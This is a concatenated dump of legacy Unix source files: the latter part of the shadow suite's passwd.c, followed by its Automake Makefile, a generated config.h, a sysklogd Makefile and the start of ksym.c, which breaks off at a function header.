		SYSLOG((LOG_WARN, TOOSOON2, sp->sp_namp));
		closelog();
		exit (1);
	}
#else	/* !SHADOWPWD */
#ifdef	ATT_AGE
	/*
	 * Can always be changed if there is no age info
	 */

	if (! pw->pw_age[0])
		return;

	last = a64l (pw->pw_age + 2) * WEEK;
	ok = last + c64i (pw->pw_age[1]) * WEEK;
#else	/* !ATT_AGE */
#ifdef	HAVE_USERSEC_H
        last = pu->upw_lastupdate / SCALE;
	ok = (last + (minage > 0 ? minage * (7*86400L):0) / SCALE);
#else
	last = 0;
	ok = 0;
#endif	/* HAVE_USERSEC_H */
#endif	/* ATT_AGE */
	if (now < ok) {
		fprintf (stderr, TOOSOON, pw->pw_name);
		SYSLOG((LOG_WARN, TOOSOON2, pw->pw_name));
		closelog();
		exit (1);
	}
#endif	/* SHADOWPWD */
}
#endif	/* AGING */

static char *
date_to_str(t)
	time_t t;
{
	static char buf[80];
	struct tm *tm;

	tm = gmtime(&t);
#ifdef HAVE_STRFTIME
	strftime(buf, sizeof buf, "%m/%d/%y", tm);
#else
	sprintf(buf, "%02d/%02d/%02d",
		tm->tm_mon + 1, tm->tm_mday, tm->tm_year % 100);
#endif
	return buf;
}

static const char *
pw_status(pass)
	const char *pass;
{
	if (*pass == '*' || *pass == '!')
		return "L";
	if (*pass == '\0')
		return "NP";
	return "P";
}

/*
 * print_status - print current password status
 */

#ifdef SHADOWPWD
/*ARGSUSED*/
static void
print_status(pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
{
	printf("%s %s %s %ld %ld %ld %ld\n",
		sp->sp_namp,
		pw_status(sp->sp_pwdp),
		date_to_str(sp->sp_lstchg * SCALE),
		(sp->sp_min * SCALE) / DAY,
		(sp->sp_max * SCALE) / DAY,
		(sp->sp_warn * SCALE) / DAY,
		(sp->sp_inact * SCALE) / DAY);
}
#elif HAVE_USERSEC_H
static void
print_status(pw, pu)
	const struct passwd *pw;
	const struct userpw *pu;
{
	printf("%s %s %s %d %d\n",
		pw->pw_name,
		pw_status(pw->pw_passwd),
		date_to_str(pu->upw_lastupdate),
		maxage > 0 ? maxage : 10000,
		minage > 0 ? minage : 0);
}
#else
static void
print_status(pw)
	const struct passwd *pw;
{
#ifdef ATT_AGE
	printf("%s %s %s %d %d",
		pw->pw_name,
		pw_status(pw->pw_passwd),
		date_to_str(pw->pw_age[0] ? a64l(pw->pw_age + 2) : 0L),
		pw->pw_age[0] ? c64i(pw->pw_age[1]) * 7 : 10000,
		pw->pw_age[0] ? c64i(pw->pw_age[0]) * 7 : 0);
#else
	printf("%s %s\n", pw->pw_name, pw_status(pw->pw_passwd));
#endif
}
#endif


static void
fail_exit(status)
	int status;
{
	pw_unlock();
#ifdef SHADOWPWD
	spw_unlock();
#endif
	exit(status);
}

static void
oom()
{
	fprintf(stderr, "%s: out of memory\n", Prog);
	fail_exit(3);
}

static char *
update_crypt_pw(cp)
	char *cp;
{
	if (do_update_pwd)
		cp = insert_crypt_passwd(cp, crypt_passwd);

	if (dflg)
		cp = "";

	if (uflg && *cp == '!')
		cp++;

	if (lflg && *cp != '!') {
		char *newpw = xmalloc(strlen(cp) + 2);

		strcpy(newpw, "!");
		strcat(newpw, cp);
		cp = newpw;
	}
	return cp;
}

static void
update_noshadow()
{
	const struct passwd *pw;
	struct passwd *npw;
	int i;
#ifdef ATT_AGE
	char age[5];
	long week;
	char *cp;
#endif

	for (i = 0; i < LOCK_TRIES; i++) {
		if (i > 0)
			sleep(1);
		if (pw_lock())
			break;
	}
	if (i == LOCK_TRIES) {
		fprintf(stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		exit(5);
	}
	if (!pw_open(O_RDWR)) {
		fprintf(stderr, OPNERROR);
		SYSLOG((LOG_ERR, OPNERROR2));
		fail_exit(3);
	}
	pw = pw_locate(name);
	if (!pw) {
		fprintf(stderr, "%s: user %s not found in /etc/passwd\n",
			Prog, name);
		fail_exit(1);
	}
	npw = __pw_dup(pw);
	if (!npw)
		oom();
	npw->pw_passwd = update_crypt_pw(npw->pw_passwd);
#ifdef ATT_AGE
	bzero(age, sizeof(age));
	STRFCPY(age, npw->pw_age);
	if (xflg) {
		if (max > 0)
			age[0] = i64c(max / 7);
		else
			age[0] = '.';
	}
	if (nflg) {
		if (age[0] == '\0')
			age[0] = '/';

		if (min > 0)
			age[1] = i64c(min / 7);
		else
			age[1] = '.';
	}
	if (do_update_age && age[0]) {
		week = time((time_t *) 0) / WEEK;
		cp = l64a(week);
		age[2] = cp[0];
		age[3] = cp[1];
	}
	if (eflg) {
		if (strlen(age) < 2) {
			age[0] = '/';
			age[1] = '.';
		}
		age[2] = '.';  /* == l64a(0L) */
		age[3] = '\0';
	}
	npw->pw_age = age;
#endif
	if (!pw_update(npw)) {
		fprintf(stderr, UPDERROR);
		SYSLOG((LOG_ERR, UPDERROR2));
		fail_exit(3);
	}
#ifdef NDBM
	if (pw_dbm_present() && !pw_dbm_update(npw)) {
		fprintf(stderr, DBMERROR);
		SYSLOG((LOG_ERR, DBMERROR2));
		fail_exit(1);
	}
	endpwent();
#endif
	if (!pw_close()) {
		fprintf(stderr, CLSERROR);
		SYSLOG((LOG_ERR, CLSERROR2));
		fail_exit(3);
	}
	pw_unlock();
}

#ifdef SHADOWPWD
static void
update_shadow()
{
	const struct spwd *sp;
	struct spwd *nsp;
	int i;

	for (i = 0; i < LOCK_TRIES; i++) {
		if (i > 0)
			sleep(1);
		if (spw_lock())
			break;
	}
	if (i == LOCK_TRIES) {
		fprintf(stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		exit(5);
	}
	if (!spw_open(O_RDWR)) {
		fprintf(stderr, OPNERROR);
		SYSLOG((LOG_ERR, OPNERROR2));
		fail_exit(3);
	}
	sp = spw_locate(name);
	if (!sp) {
		fprintf(stderr, "%s: user %s not found in /etc/shadow\n",
			Prog, name);
		fail_exit(1);
	}
	nsp = __spw_dup(sp);
	if (!nsp)
		oom();
	nsp->sp_pwdp = update_crypt_pw(nsp->sp_pwdp);
	if (xflg)
		nsp->sp_max = (max * DAY) / SCALE;
	if (nflg)
		nsp->sp_min = (min * DAY) / SCALE;
	if (wflg)
		nsp->sp_warn = (warn * DAY) / SCALE;
	if (iflg)
		nsp->sp_inact = (inact * DAY) / SCALE;
	if (do_update_age)
		nsp->sp_lstchg = time((time_t *) 0) / SCALE;
	/*
	 * Force change on next login, like SunOS 4.x passwd -e or
	 * Solaris 2.x passwd -f.  Solaris 2.x seems to do the same
	 * thing (set sp_lstchg to 0).
	 */
	if (eflg)
		nsp->sp_lstchg = 0;

	if (!spw_update(nsp)) {
		fprintf(stderr, UPDERROR);
		SYSLOG((LOG_ERR, UPDERROR2));
		fail_exit(3);
	}
#ifdef NDBM
	if (sp_dbm_present() && !sp_dbm_update(nsp)) {
		fprintf(stderr, DBMERROR);
		SYSLOG((LOG_ERR, DBMERROR2));
		fail_exit(3);
	}
	endspent();
#endif
	if (!spw_close()) {
		fprintf(stderr, CLSERROR);
		SYSLOG((LOG_ERR, CLSERROR2));
		fail_exit(3);
	}
	spw_unlock();
}
#endif  /* SHADOWPWD */

static void
checkroot()
{
	if (!amroot) {
		fprintf(stderr, "%s: Permission denied\n", Prog);
		exit(1);
	}
}


/*
 * passwd - change a user's password file information
 *
 *	This command controls the password file and commands which are
 * 	used to modify it.
 *
 *	The valid options are
 *
 *	-l	lock the named account (*)
 *	-u	unlock the named account (*)
 *	-d	delete the password for the named account (*)
 *	-e	expire the password for the named account (*)
 *	-x #	set sp_max to # days (*)
 *	-n #	set sp_min to # days (*)
 *	-w #	set sp_warn to # days (*)
 *	-i #	set sp_inact to # days (*)
 *	-S	show password status of named account (*)
 *	-g	execute gpasswd command to interpret flags
 *	-f	execute chfn command to interpret flags
 *	-s	execute chsh command to interpret flags
 *
 *	(*) requires root permission to execute.
 *
 *	All of the time fields are entered in days and converted to the
 * 	appropriate internal format.  For finer resolute the chage
 *	command must be used.
 *
 *	Exit status:
 *	0 - success
 *	1 - permission denied
 *	2 - invalid combination of options
 *	3 - unexpected failure, password file unchanged
 *	5 - password file busy, try again later
 *	6 - invalid argument to option
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	*cp;			/* Miscellaneous character pointing  */
	int	flag;			/* Current option to process         */
	const struct passwd *pw;	/* Password file entry for user      */
#ifdef SHADOWPWD
	const struct spwd *sp;		/* Shadow file entry for user        */
#endif
#ifdef HAVE_USERSEC_H
	struct  userpw  userpw, *pu;
#endif

	/*
	 * The program behaves differently when executed by root
	 * than when executed by a normal user.
	 */

	amroot = (getuid () == 0);

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.
	 */

	Prog = Basename(argv[0]);

	openlog("passwd", LOG_PID|LOG_CONS|LOG_NOWAIT, LOG_AUTH);

	/*
	 * Start with the flags which cause another command to be
	 * executed.  The effective UID will be set back to the
	 * real UID and the new command executed with the flags
	 *
	 * These flags are deprecated, may change in a future
	 * release.  Please run these programs directly.  --marekm
	 */

	if (argc > 1 && argv[1][0] == '-' && strchr ("gfs", argv[1][1])) {
		char buf[BUFSIZ];

		setuid (getuid ());
		switch (argv[1][1]) {
			case 'g':
				argv[1] = GPASSWD_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			case 'f':
				argv[1] = CHFN_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			case 's':
				argv[1] = CHSH_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			default:
				usage(6);
		}
		sprintf (buf, EXECFAILED, Prog, argv[1]);
		perror (buf);
		SYSLOG((LOG_ERR, EXECFAILED2, argv[1]));
		closelog();
		exit (1);
	}

	/* 
	 * The remaining arguments will be processed one by one and
	 * executed by this command.  The name is the last argument
	 * if it does not begin with a "-", otherwise the name is
	 * determined from the environment and must agree with the
	 * real UID.  Also, the UID will be checked for any commands
	 * which are restricted to root only.
	 */

#ifdef SHADOWPWD
#define FLAGS "dlun:x:w:i:eS"
#else
#ifdef AGING
#define FLAGS "dlun:x:S"
#else
#define FLAGS "dluS"
#endif
#endif
	while ((flag = getopt(argc, argv, FLAGS)) != EOF) {
#undef FLAGS
		switch (flag) {
#ifdef	AGING
			case 'x':
				checkroot();
				max = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				xflg++;
				break;
			case 'n':
				checkroot();
				min = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				nflg++;
				break;
#ifdef	SHADOWPWD
			case 'w':
				checkroot();
				warn = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				if (warn >= -1)
					wflg++;
				break;
			case 'i':
				checkroot();
				inact = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				if (inact >= -1)
					iflg++;
				break;
#endif	/* SHADOWPWD */
			case 'e':
				checkroot();
				eflg++;
				break;
#endif	/* AGING */
			case 'S':
				checkroot();
				Sflg++;
				break;
			case 'd':
				checkroot();
				dflg++;
				break;
			case 'l':
				checkroot();
				lflg++;
				break;
			case 'u':
				checkroot();
				uflg++;
				break;
			default:
				usage(6);
		}
	}

	/*
	 * If any of the flags were given, a user name must be supplied
	 * on the command line.  Only an unadorned command line doesn't
	 * require the user's name be given.  Also, on -x, -n, -m, and
	 * -i may appear with each other.  -d, -l and -S must appear alone.
	 */

	if ((dflg || lflg || uflg || Sflg ||
	     xflg || nflg || wflg || iflg || eflg) && optind >= argc)
		usage(2);

	if (dflg + lflg + uflg + Sflg +
	    (xflg || nflg || wflg || iflg || eflg) > 1)
		usage(2);

#ifdef	NDBM
#ifdef	SHADOWPWD
	sp_dbm_mode = O_RDWR;
#endif
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Now I have to get the user name.  The name will be gotten 
	 * from the command line if possible.  Otherwise it is figured
	 * out from the environment.
	 */

	if (optind < argc) {
		name = argv[optind];
#if 0  /* XXX */
	} else if (amroot) {
		name = "root";
#endif
	} else if ((cp = getlogin())) {
		name = xstrdup(cp);
	} else if ((pw = getpwuid(getuid()))) {
		name = xstrdup(pw->pw_name);
	} else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog();
		exit (1);
	}

	/*
	 * Now I have a name, let's see if the UID for the name
	 * matches the current real UID.
	 */

	if (! (pw = getpwnam (name))) {
		fprintf (stderr, UNKUSER, Prog, name);
		closelog();
		exit (1);
	}
	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, name);
		SYSLOG((LOG_WARN, NOPERM2, name));
		closelog();
		exit (1);
	}

#ifdef  HAVE_USERSEC_H

        /*
         * The aging information lives someplace else.  Get it from the
         * login.cfg file
         */

        if (getconfattr (SC_SYS_PASSWD, SC_MINAGE, &minage, SEC_INT))
                minage = -1;

        if (getconfattr (SC_SYS_PASSWD, SC_MAXAGE, &maxage, SEC_INT))
                maxage = -1;

        pu = getuserpw (name);
        curage = (time (0) - pu->upw_lastupdate) / (7*86400L);
        if (! amroot && minage > 0 && curage < minage) {
                fprintf (stderr, CANTCHANGE, pw->pw_name);
                SYSLOG((LOG_WARN, CANTCHANGE2, pw->pw_name));
                closelog();
                exit (1);
        }
#endif	/* HAVE_USERSEC_H */

#ifdef	SHADOWPWD
	/*
	 * The user name is valid, so let's get the shadow file
	 * entry.
	 */

	sp = getspnam(name);
	if (!sp)
		sp = pwd_to_spwd(pw);
#endif	/* SHADOWPWD */

	if (Sflg) {
#ifdef	SHADOWPWD
		print_status (pw, sp);
#else
#ifdef	HAVE_USERSEC_H
		pu = getuserpw (name);
		print_status (pw, pu);
#else
		print_status (pw);
#endif	/* HAVE_USERSEC_H */
#endif	/* SHADOWPWD */
		closelog();
		exit (0);
	}

#ifdef	SHADOWPWD
	cp = sp->sp_pwdp;
#else
	cp = pw->pw_passwd;
#endif
	/*
	 * If there are no other flags, just change the password.
	 */

	if (!(dflg || lflg || uflg || xflg || nflg || wflg || iflg || eflg)) {
		/*
		 * Let the user know whose password is being changed.
		 */
		printf(CHANGING, name);
#ifdef AUTH_METHODS
		if (strchr(cp, '@')) {
			if (pw_auth(cp, name, PW_CHANGE, (char *)0)) {
				SYSLOG((LOG_INFO, NOCHGPASSWD, name));
				closelog();
				exit (1);
			} else if (! uses_default_method(cp)) {
				do_update_age = 1;
				goto done;
			}
		} else
#endif
			STRFCPY(crypt_passwd, cp);

		/*
		 * See if the user is permitted to change the password.
		 * Otherwise, go ahead and set a new password.
		 */

		/* XXX - not called on AIX.  JFH's bug??  --marekm */

#ifdef	SHADOWPWD
		check_password (pw, sp);
#else
#ifdef	AGING
		/*
		 * Only check the age when there is one to check.
		 */

		check_password (pw);
#endif
#endif
		if (new_password (pw)) {
			fprintf (stderr, UNCHANGED, name);
			closelog();
			exit (1);
		}
		do_update_pwd = 1;
		do_update_age = 1;
	}

#ifdef AUTH_METHODS
done:
#endif
	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

#ifdef  HAVE_USERSEC_H

        /*
         * AIX very conveniently has its own mechanism for updating
         * passwords.  Use it instead ...
         */

        strcpy (userpw.upw_name, pw->pw_name);
        userpw.upw_passwd = pw->pw_passwd;
        userpw.upw_lastupdate = time (0);
        userpw.upw_flags = 0;

	setpwdb (S_WRITE);

        if (putuserpw (&userpw)) {
                fprintf (stderr, UPDERROR);
                SYSLOG((LOG_ERR, UPDERROR2));
                closelog();
                exit (1);
        }
	endpwdb ();
#else   /* !HAVE_USERSEC_H */

#ifdef SHADOWPWD
	if (access(SHADOW_FILE, 0) == 0)
		update_shadow();
	else
#endif
		update_noshadow();

#endif	/* HAVE_USERSEC_H */
	SYSLOG((LOG_INFO, amroot ? CHGPASSWD_ROOT : CHGPASSWD, name));
	closelog();
	printf(CHANGED);
	exit (0);
	/*NOTREACHED*/
}

AUTOMAKE_OPTIONS = 1.0 foreign

# Watch out; note the difference between prefix & exec_prefix.
# Normally configure sets exec_prefix to root when prefix is /usr.

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
ubindir = ${prefix}/bin
usbindir = ${prefix}/sbin

noinst_HEADERS = patchlevel.h

bin_PROGRAMS = login
usbin_PROGRAMS = chpasswd dpasswd faillog groupadd groupdel groupmod \
 lastlog logoutd mkpasswd newusers \
 useradd userdel usermod grpck pwck

# id and groups are from gnu, the rest is perhaps not important
# also suid programs are installed by hand.

suidbins = su
suidubins = chage chfn chsh expiry gpasswd newgrp passwd

install-exec-local:
	$(mkinstalldirs) $(bindir)
	for i in $(suidbins); do \
	  $(INSTALL) -m 4755 $$i $(bindir); \
	done
	$(mkinstalldirs) $(ubindir)
	for i in $(suidubins); do \
	  $(INSTALL) -m 4755 $$i $(ubindir); \
	done
	rm -f $(bindir)/sg
	ln -s $(ubindir)/newgrp $(bindir)/sg

# login-static removed - too big and not really needed, it is better to
# upgrade your telnetd, the LD_xxx bug is sooo old...  --marekm

noinst_PROGRAMS = grpconv grpunconv pwconv pwconv5 pwunconv \
 id groups scologin \
 su \
 chage chfn chsh expiry gpasswd newgrp passwd \
 sulogin

LDADD=../libmisc/libmisc.a ../lib/libshadow.a
INCLUDES= -I$(top_srcdir)/lib

# These are to trick the linker to link only libcrypt statically

STATLINK = -Wl,-Bstatic
DYNLINK = -Wl,-Bdynamic

login_static_SOURCES = login.c

# Some tools need libcrypt.
chfn_LDADD = $(LDADD) @LIBCRYPT@
chpasswd_LDADD = $(LDADD) @LIBCRYPT@
chsh_LDADD = $(LDADD) @LIBCRYPT@
dpasswd_LDADD = $(LDADD) @LIBCRYPT@
gpasswd_LDADD = $(LDADD) @LIBCRYPT@
login_LDADD = $(LDADD) @LIBCRYPT@ @LIBSKEY@
login_static_LDADD = $(LDADD) @LIBCRYPT@ @LIBSKEY@ -static
newgrp_LDADD = $(LDADD) @LIBCRYPT@
newusers_LDADD = $(LDADD) @LIBCRYPT@
passwd_LDADD = $(LDADD) @LIBCRYPT@ @LIBCRACK@
su_LDADD = $(LDADD) @LIBCRYPT@ @LIBSKEY@
# I think it's better...
sulogin_LDADD = $(LDADD) $(STATLINK) @LIBCRYPT@ $(DYNLINK)
/* config.h.  Generated automatically by configure.  */
/* config.h.in.  Generated automatically from configure.in by autoheader.  */

/* Define to empty if the keyword does not work.  */
/* #undef const */

/* Define to the type of elements in the array set by `getgroups'.
   Usually this is either `int' or `gid_t'.  */
#define GETGROUPS_T gid_t

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef gid_t */

/* Define if your struct stat has st_rdev.  */
#define HAVE_ST_RDEV 1

/* Define if you have <sys/wait.h> that is POSIX.1 compatible.  */
#define HAVE_SYS_WAIT_H 1

/* Define if utime(file, NULL) sets file's timestamp to the present.  */
#define HAVE_UTIME_NULL 1

/* Define to `long' if <sys/types.h> doesn't define.  */
/* #undef off_t */

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef pid_t */

/* Define as the return type of signal handlers (int or void).  */
#define RETSIGTYPE void

/* Define if you have the ANSI C header files.  */
#define STDC_HEADERS 1

/* Define if you can safely include both <sys/time.h> and <time.h>.  */
#define TIME_WITH_SYS_TIME 1

/* Define if your <sys/time.h> declares struct tm.  */
/* #undef TM_IN_SYS_TIME */

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef uid_t */

/* Define if you do not have <strings.h>, index, bzero, etc..  */
#define USG 1

/* Define to enable password aging.  */
#define AGING 1

/* Define if struct passwd has pw_age.  */
/* #undef ATT_AGE */

/* Define if struct passwd has pw_comment.  */
/* #undef ATT_COMMENT */

/* Define if struct passwd has pw_quota.  */
/* #undef BSD_QUOTA */

/* Define if struct lastlog has ll_host */
#define HAVE_LL_HOST 1

/* Working shadow group support in libc?  */
#define HAVE_SHADOWGRP 1

/* Path for lastlog file.  */
#define LASTLOG_FILE "/var/log/lastlog"

/* Location of system mail spool directory.  */
#define MAIL_SPOOL_DIR "/var/spool/mail"

/* Define to support the MD5-based password hashing algorithm.  */
#define MD5_CRYPT 1

/* Define for production version.  */
#define NDEBUG 1

/* Define if you don't have a64l().  XXX */
#define NEED_AL64 1

/* Define if login should support the -r flag for rlogind.  */
#define RLOGIN 1

/* Define to the ruserok() "success" return value (0 or 1).  */
#define RUSEROK 0

/* Define to support the shadow password file.  */
#define SHADOWPWD 1

/* Define to support the shadow group file.  */
/* #undef SHADOWGRP */

/* Define to support S/Key logins.  */
/* #undef SKEY */

/* Define to use syslog().  */
#define USE_SYSLOG 1

/* Define if you have ut_host in struct utmp.  */
#define UT_HOST 1

/* Path for utmp file.  */
#define _UTMP_FILE "/var/run/utmp"

/* Define to ut_name if struct utmp has ut_name (not ut_user).  */
/* #undef UT_USER */

/* Path for wtmp file.  */
#define _WTMP_FILE "/var/log/wtmp"

/* Defined if you have libcrypt.  */
/* #undef HAVE_LIBCRYPT */

/* Defined if you have libcrack.  */
/* #undef HAVE_LIBCRACK */

/* Defined if you have the ts&szs cracklib.  */
/* #undef HAVE_LIBCRACK_HIST */

/* Defined if it includes *Pw functions.  */
/* #undef HAVE_LIBCRACK_PW */

#define CHFN_PROGRAM "/usr/bin/chfn"
#define CHSH_PROGRAM "/usr/bin/chsh"
#define GPASSWD_PROGRAM "/usr/bin/gpasswd"
#define PASSWD_PROGRAM "/usr/bin/passwd"

#define LOGIN_ACCESS
#define SU_ACCESS

/* see faillog.h for more info what it is */
#define FAILLOG_LOCKTIME

/* see lmain.c and login.defs.linux */
#define CONSOLE_GROUPS

/* Define if you have the getgroups function.  */
#define HAVE_GETGROUPS 1

/* Define if you have the gethostname function.  */
#define HAVE_GETHOSTNAME 1

/* Define if you have the getspnam function.  */
#define HAVE_GETSPNAM 1

/* Define if you have the gettimeofday function.  */
#define HAVE_GETTIMEOFDAY 1

/* Define if you have the getusershell function.  */
#define HAVE_GETUSERSHELL 1

/* Define if you have the getutent function.  */
#define HAVE_GETUTENT 1

/* Define if you have the initgroups function.  */
#define HAVE_INITGROUPS 1

/* Define if you have the setgroups function.  */
#define HAVE_SETGROUPS 1

/* Define if you have the sigaction function.  */
#define HAVE_SIGACTION 1

/* Define if you have the strcspn function.  */
#define HAVE_STRCSPN 1

/* Define if you have the strftime function.  */
#define HAVE_STRFTIME 1

/* Define if you have the strptime function.  */
#define HAVE_STRPTIME 1

/* Define if you have the strspn function.  */
#define HAVE_STRSPN 1

/* Define if you have the strtol function.  */
#define HAVE_STRTOL 1

/* Define if you have the <dirent.h> header file.  */
#define HAVE_DIRENT_H 1

/* Define if you have the <fcntl.h> header file.  */
#define HAVE_FCNTL_H 1

/* Define if you have the <gshadow.h> header file.  */
/* #undef HAVE_GSHADOW_H */

/* Define if you have the <lastlog.h> header file.  */
#define HAVE_LASTLOG_H 1

/* Define if you have the <limits.h> header file.  */
#define HAVE_LIMITS_H 1

/* Define if you have the <ndir.h> header file.  */
/* #undef HAVE_NDIR_H */

/* Define if you have the <paths.h> header file.  */
#define HAVE_PATHS_H 1

/* Define if you have the <sgtty.h> header file.  */
/* #undef HAVE_SGTTY_H */

/* Define if you have the <shadow.h> header file.  */
#define HAVE_SHADOW_H 1

/* Define if you have the <sys/dir.h> header file.  */
/* #undef HAVE_SYS_DIR_H */

/* Define if you have the <sys/ioctl.h> header file.  */
#define HAVE_SYS_IOCTL_H 1

/* Define if you have the <sys/ndir.h> header file.  */
/* #undef HAVE_SYS_NDIR_H */

/* Define if you have the <sys/resource.h> header file.  */
#define HAVE_SYS_RESOURCE_H 1

/* Define if you have the <sys/time.h> header file.  */
#define HAVE_SYS_TIME_H 1

/* Define if you have the <syslog.h> header file.  */
#define HAVE_SYSLOG_H 1

/* Define if you have the <termio.h> header file.  */
#define HAVE_TERMIO_H 1

/* Define if you have the <termios.h> header file.  */
#define HAVE_TERMIOS_H 1

/* Define if you have the <ulimit.h> header file.  */
#define HAVE_ULIMIT_H 1

/* Define if you have the <unistd.h> header file.  */
#define HAVE_UNISTD_H 1

/* Define if you have the <usersec.h> header file.  */
/* #undef HAVE_USERSEC_H */

/* Define if you have the <utime.h> header file.  */
#define HAVE_UTIME_H 1

/* Define if you have the <utmp.h> header file.  */
#define HAVE_UTMP_H 1

/* Define if you have the <utmpx.h> header file.  */
/* #undef HAVE_UTMPX_H */
# Makefile for syslogd and klogd daemons.

CC= gcc
#CFLAGS= -g -DSYSV -Wall
#LDFLAGS= -g
CFLAGS= -O6 -DSYSV -fomit-frame-pointer -Wall
LDFLAGS= -s -N

# There is one report that under an all ELF system there may be a need to
# explicilty link with libresolv.a.  If linking syslogd fails you may wish
# to try uncommenting the following define.
# LIBS = /usr/lib/libresolv.a

# Define the following to impart start-up delay in klogd.  This is
# useful if klogd is started simultaneously or in close-proximity to syslogd.
# KLOGD_START_DELAY = -DKLOGD_DELAY=5

# The following define determines whether the package adheres to the
# file system standard.
FSSTND = -DFSSTND

# The following define establishes the name of the pid file for the
# syslogd daemon.  The library include file (paths.h) defines the
# name for the syslogd pid to be syslog.pid.  A number of people have
# suggested that this should be syslogd.pid.  You may cast your
# ballot below.
# SYSLOGD_PIDNAME = -DSYSLOGD_PIDNAME=\"syslogd.pid\"

SYSLOGD_FLAGS= -DSYSLOG_INET -DSYSLOG_UNIXAF -DNO_SCCS ${FSSTND} \
	${SYSLOGD_PIDNAME}
SYSLOG_FLAGS= -DALLOW_KERNEL_LOGGING
KLOGD_FLAGS = ${FSSTND} ${KLOGD_START_DELAY}

.c.o:
	${CC} ${CFLAGS} -c $*.c

all:	syslogd	 

syslogd: syslogd.o pidfile.o
	${CC} ${LDFLAGS} -o syslogd syslogd.o pidfile.o ${LIBS}

syslogd.o: syslogd.c version.h
	${CC} ${CFLAGS} ${SYSLOGD_FLAGS} -c syslogd.c

syslog.o: syslog.c
	${CC} ${CFLAGS} ${SYSLOG_FLAGS} -c syslog.c

ksym.o: ksym.c klogd.h
	${CC} ${CFLAGS} ${KLOGD_FLAGS} -c ksym.c

clean:
	rm -f *.o *.log *~ *.orig;
	rm -f syslogd klogd syslog_tst TAGS;
/*
    ksym.c - functions for kernel address->symbol translation
    Copyright (c) 1995  Dr. G.W. Wettstein <greg@wind.rmcc.com>

    This file is part of the sysklogd package, a kernel and system log daemon.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/*
 * This file contains functions which handle the translation of kernel
 * numeric addresses into symbols for the klogd utility.
 *
 * Sat Oct 28 09:00:14 CDT 1995:  Dr. Wettstein
 *	Initial Version.
 *
 * Fri Nov 24 12:50:52 CST 1995:  Dr. Wettstein
 *	Added VERBOSE_DEBUGGING define to make debugging output more
 *	manageable.
 *
 *	Added support for verification of the loaded kernel symbols.  If
 *	no version information can be be found in the mapfile a warning
 *	message is issued but translation will still take place.  This
 *	will be the default case if kernel versions < 1.3.43 are used.
 *
 *	If the symbols in the mapfile are of the same version as the kernel
 *	that is running an informative message is issued.  If the symbols
 *	in the mapfile do not match the current kernel version a warning
 *	message is issued and translation is disabled.
 *
 * Wed Dec  6 16:14:11 CST 1995:  Dr. Wettstein
 *	Added /boot/System.map to the list of symbol maps to search for.
 *	Also made this map the first item in the search list.  I am open
 *	to CONSTRUCTIVE suggestions for any additions or corrections to
 *	the list of symbol maps to search for.  Be forewarned that the
 *	list in use is the consensus agreement between myself, Linus and
 *	some package distributers.  It is a given that no list will suit
 *	everyone's taste.  If you have rabid concerns about the list
 *	please feel free to edit the system_maps array and compile your
 *	own binaries.
 *
 *	Added support for searching of the list of symbol maps.  This
 *	allows support for access to multiple symbol maps.  The theory
 *	behind this is that a production kernel may have a system map in
 *	/boot/System.map.  If a test kernel is booted this system map
 *	would be skipped in favor of one found in /usr/src/linux.
 *
 * Thu Jan 18 11:18:31 CST 1996:  Dr. Wettstein
 *	Added patch from beta-testers to allow for reading of both
 *	ELF and a.out map files.
 *
 */


/* Includes. */
#include <stdlib.h>
#include <malloc.h>
#include <sys/utsname.h>
#include "klogd.h"

#define VERBOSE_DEBUGGING 0


/* Variables, structures and type definitions static to this module. */
struct sym_table
{
	unsigned long value;
	char *name;
};

struct symbol
{
	char *name;
	int size;
	int offset;
};

static struct sym_table *sym_array = (struct sym_table *) 0;

static int num_syms = 0;

static char *system_maps[] =
{
	"/boot/System.map",
	"/System.map",
	"/usr/src/linux/System.map",
#if defined(TEST)
	"./System.map",
#endif
	(char *) 0
};


#if defined(TEST)
static int debugging = 1;
#else
extern int debugging;
#endif


/* Function prototypes. */
static char * FindSymbolFile(void);
static int AddSymbol(unsigned long, char*);
static char * LookupSymbol(unsigned long, struct symbol *);
static int CheckVersion(char *);


/**************************************************************************
 * Function:	InitKsyms
 *
 * Purpose:	This function is responsible for initializing and loading
 *		the data tables used by the kernel address translations.
 *
 * Arguements:	(char *) mapfile
 *
 *			mapfile:->	A pointer to a complete path
 *					specification of the file containing
 *					the kernel map to use.
 *
 * Return:	int
 *
 *		A boolean style context is returned.  The return value will
 *		be true if initialization was successful.  False if not.
 **************************************************************************/

extern int InitKsyms(mapfile)

	char *mapfile;

{
